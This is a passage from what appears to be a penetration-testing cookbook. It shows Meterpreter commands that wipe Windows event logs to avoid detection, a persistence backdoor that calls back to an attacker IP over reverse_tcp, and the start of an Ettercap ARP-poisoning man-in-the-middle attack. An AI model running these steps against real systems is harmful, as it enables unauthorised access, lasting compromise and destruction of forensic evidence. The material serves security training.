- fmt: '

    There are several different ways you can approach collecting data from a victim''s
    machine. In this recipe, we used `Metasploit` and a `Meterpreter` keyscan to record
    keystrokes, but we could have easily used `Wireshark` or `airodump-ng` to collect
    the data.


    The key here is to explore other tools so that you can find which tool you like
    best to accomplish your goal.


    # Cleaning up the tracks


    In this recipe we will use `Metasploit` to erase our tracks. Cleaning up after
    compromising a host is an extremely important step because you don''t want to
    go through all of the trouble of gaining access only to get caught. Luckily for
    us, `Metasploit` has a way for us to clean up our tracks very easily.


    ![](images/00173.jpeg)


    # Escalating Privileges


    ## Getting ready


    To execute this recipe we will need the following:

    - A connection to the Internet or intranet

    - A compromised machine using the `Metasploit` framework is also required


    ### How to do it...


    The steps to be performed are as follows:


    1. Let''s begin the process of cleaning our tracks from a `Meterpreter` shell.
    You will have to use `Metasploit` to attack a host in order to gain a `Meterpreter`
    shell. You can use one of the recipes in Chapter 6, Exploiting Vulnerabilities,
    to gain access to a host using `Metasploit`. Once you have gained access to your
    victim using a `Metasploit` exploit with a `Meterpreter` payload, await for your
    `Meterpreter` prompt to display:


    2. Next, we need to run the `IRB` in order to begin the log removal process. We
    open the help file:

    ```

    irb

    ```


    3. Next, we tell the `IRB` which log we would like to remove. Following are some
    available choices.

    - `log = client.sys.eventlog.open(''system'')`

    - `log = client.sys.eventlog.open(''security'')`

    - `log = client.sys.eventlog.open(''application'')`

    - `log = client.sys.eventlog.open(''directory service'')`

    - `log = client.sys.eventlog.open(''dns server'')`

    - `log = client.sys.eventlog.open(''file replication service'')`


    ![](images/00174.jpeg)


    4. For our purposes, we will clear them all. You will have to type these in one
    at a time.

    ```

    log = client.sys.eventlog.open(''system'')

    log = client.sys.eventlog.open(''security'')

    log = client.sys.eventlog.open(''application'')

    log = client.sys.eventlog.open(''directory service'')

    log = client.sys.eventlog.open(''dns server'')

    log = client.sys.eventlog.open(''file replication service'')

    ```


    5. Now, we execute our command to erase the log files:

    ```

    Log.clear

    ```


    6. That''s it! With just a few commands we have been able to cover our tracks!


    ### How it works...


    In this recipe, we used `Meterpreter` to cover our tracks on a compromised host.
    We began the recipe from a `Meterpreter` shell and started the `IRB` (a Ruby interpreter
    shell). Next, we specified exactly which files we wanted to have removed and concluded
    the recipe by issuing the `Log.clear` command to clear the logs. Remember, you
    want to perform this step last, once we compromise a host; you don''t want to
    perform another function after covering your tracks only to add more log entries,
    and so on.


    # Creating a persistent backdoor


    In this recipe, we will create a persistent backdoor using the `Metasploit` persistence.
    Once you have succeeded in gaining access to a compromised machine, you will want
    to explore ways to regain access to the machine without having to break into it
    again. If the user of the compromised machine does something to disrupt the connection,
    such as reboot the machine, the use of a backdoor will allow a connection to re-establish
    to your machine. This is where creating a backdoor comes in handy because it allows
    you to maintain access to a previously compromised machine.


    ## Getting ready


    To execute this recipe we will need the following:

    - A connection to the Internet or intranet

    - A compromised machine using the `Metasploit` framework is also required


    ![](images/00175.jpeg)


    # Escalating Privileges


    ### How to do it...


    Let''s begin the process of installing our persistent backdoor. You will have
    to use `Metasploit` to attack a host in order to gain a `Meterpreter` shell. You
    can use one of the recipes in Chapter 6, Exploiting Vulnerabilities, to gain access
    to a host using `Metasploit`.


    1. Once you have gained access to your victim using a `Metasploit` exploit with
    a `Meterpreter` payload, await for your `Meterpreter` prompt to display:


    2. Next, we need to run `persistence` to set up our backdoor. We open the help
    file:

    ```

    run persistence -h

    ```


    3. The `persistence` backdoor has many options, including:

    - `-A`: This option automatically starts a multhandler to connect to the agent.

    - `-S`: This option allows the backdoor to automatically start as a service.

    - `-U`: This option allows the backdoor to automatically start when the user boots.

    - `-i`: This option sets the number of seconds between attempts back the attacker
    machine (in seconds).

    - `-p`: This option sets the port to which `Metasploit` is listening on the attacker
    machine.

    - `-P`: This option sets the payload to use. `Reverse_tcp` is used by default
    and is generally the one you want to use.

    - `-r`: This option sets the IP address of the attacker machine.


    4. Now, we execute our command to set up the backdoor:

    ```

    run persistence -U -A -i 10 -p 8090 -r 192.168.10.109

    ```


    ![](images/00176.jpeg)


    5. The backdoor is now set! If successful, you will notice that you have a second
    `Meterpreter` session!


    ### How it works...


    In this recipe, we used `Meterpreter` to set up a persistent backdoor. We began
    the recipe after compromising the host and obtaining a `Meterpreter` shell. We
    then explored some of the available options to `persistence` by reviewing its
    help file. Finally, we completed the installation of the backdoor by running the
    installation command and setting its options.


    # Man In The Middle (MITM) attack


    In this recipe, we will use a Man In The Middle (MITM) attack against one of our
    targets. A MITM attack works by allowing us to eavesdrop on the communication
    between our target and their legitimate party. For our example, we could utilize
    `Ettercap` to eavesdrop on the communication of a Windows host while checking
    their-mail on `http://www.yahoo.com`.


    ## Getting ready


    To execute this recipe we will need the following:

    - A wireless connection to the network

    - A machine on the network connected to the wireless network


    ![](images/00177.jpeg)


    # Escalating Privileges


    ### How to do it...


    Let''s begin the Man In Middle attack by launching `Ettercap`.


    1. Open a terminal window and start `Ettercap`. Using the `-G` option launches
    the GUI (Graphical User Interface):

    ```

    ettercap -G

    ```


    2. We begin the process by turning on unified sniffing. You can press `Shift+U`
    or use the menu and go to `Sniff|Unified sniffing...`, as shown in the following
    screenshot:


    ![](images/00178.jpeg)


    3. Select the network interface. In the case of using a MITM attack, we should
    select our wireless interface:


    4. Next, we turn on the scan for hosts. This can be accomplished by pressing `Ctrl+S`
    or use the menu and go to `Hosts|Scan for hosts` as shown in the following screenshot:


    5. Next, we bring up the hosts lists. You can either press `H` or use the menu
    and go to `Hosts|Host List:`


    ![](images/00179.jpeg)


    6. Next, we need to select and set our targets. In our case, we will select `192.168.10.111`
    as our target 1 by highlighting its IP address and pressing the `Add To Target
    1` button:


    7. Now, we are able to allow `Ettercap` to begin sniffing. You can press `Ctrl+W`
    or use the menu and go to `Start|Start Sniffing:`


    8. Finally, we begin the ARP poisoning process. From the menu, go to `Mitm|Arp
    poisoning...`


    ![](images/00180.jpeg)

